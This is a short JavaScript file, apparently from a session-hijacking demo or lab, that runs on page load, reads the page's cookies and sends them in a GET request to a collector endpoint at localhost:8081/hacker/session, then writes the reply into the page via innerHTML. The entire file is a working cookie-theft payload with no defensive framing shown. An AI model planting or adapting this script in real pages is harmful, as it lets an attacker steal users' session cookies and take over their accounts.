window.onload = function(){
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          document.getElementById("demo").innerHTML =
          this.responseText;
        }
    };
    let cookie = document.cookie;
    xhttp.open("GET", "http://localhost:8081/hacker/session?sessionId="+cookie, true);
    xhttp.send();
};
